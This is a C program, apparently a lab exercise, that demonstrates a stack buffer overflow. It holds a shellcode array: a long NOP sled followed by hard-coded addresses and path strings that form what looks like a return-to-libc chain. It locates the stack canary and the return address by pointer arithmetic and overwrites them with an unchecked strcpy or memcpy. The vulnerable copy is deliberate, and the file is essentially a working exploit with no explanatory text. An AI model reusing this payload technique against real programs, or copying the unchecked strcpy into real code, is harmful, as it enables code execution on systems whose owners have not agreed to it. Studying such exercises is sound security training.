#include <stdio.h>

#define A 0x41

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xd1\xf0\xb7\x2f\x75\x73\x72\x28\xa0\x04\x08\x9f\x60\xe4\xb7\x60\xd1\xf0\xb7\x2f\x62\x69\x6e\x2c\xa0\x04\x08\x9f\x60\xe4\xb7\x60\xd1\xf0\xb7\x2f\x6c\x73\x6f\x30\xa0\x04\x08\x9f\x60\xe4\xb7\x60\xd1\xf0\xb7\x66\x61\x61\x61\x34\xa0\x04\x08\x9f\x60\xe4\xb7\x64\xc9\xe4\xb7\xbb\x68\xe4\xb7\x01\x01\x01\x01\x35\xa0\x04\x08\x71\xb3\xf2\xb7\x02\x71\xf1\xb7\x35\xa0\x04\x08\x28\xa0\x04\x08\x28\x5a\xf6\xb7\x75\x2a\xed\xb7";

long *return_addr, *canary_h, *canary_l;

int main(int argc, char *argv[]) {

    char buffer[256];
    // the extra 8 is the canary bytes
    return_addr = buffer + 256 + 8 + 4;
    canary_h = buffer + 256;
    canary_l = buffer + 256 + 4;
    memset(buffer, A, sizeof(buffer));
    // To check if shellcode is broken
    printf("\nargc: %d\n\n", argc);
    printf("Contents of return address before buffer overflow: %010p\n\n", *return_addr);
    printf("Canary bytes: %010p %010p\n\n", *canary_h, *canary_l);
    printf("Buffer address: %010p\n\n", buffer);
    printf("Return address: %010p\n\n", return_addr);
    if (argc > 1) {
        strcpy(buffer, argv[1]);
    } else {
        memcpy(buffer, default_shellcode, sizeof(default_shellcode)/sizeof(char));
    }   
    printf("Contents of return address after buffer overflow: %010p\n\n", *return_addr);
        
    return 0;
}